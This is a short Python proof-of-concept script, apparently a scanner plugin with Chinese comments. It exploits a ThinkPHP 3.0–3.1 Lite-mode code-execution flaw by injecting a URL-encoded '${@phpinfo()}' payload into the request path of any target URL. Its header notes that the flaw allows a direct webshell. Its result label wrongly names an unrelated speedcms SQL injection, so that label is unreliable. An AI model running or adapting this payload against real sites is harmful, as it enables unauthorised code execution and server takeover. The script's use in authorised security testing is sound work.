#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: ThinkPHP 代码执行漏洞
referer: http://zone.wooyun.org/index.php?do=view&id=44
author: Lucifer
description: ThinkPHP 版本3.0~3.1开启Lite模式后preg_replace使用了/e选项，同时第二个参数使用双引号，所以造成了代码执行，可直接GETSHELL
'''
import sys
import requests
import warnings
def run(url):
        result = ['speedcms list文件参数cid SQL注入','','']
        payload = "/index.php/Index/index/name/$%7B@phpinfo%28%29%7D"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, timeout=10, verify=False)

            if r"Configuration File (php.ini) Path" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
                return result
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
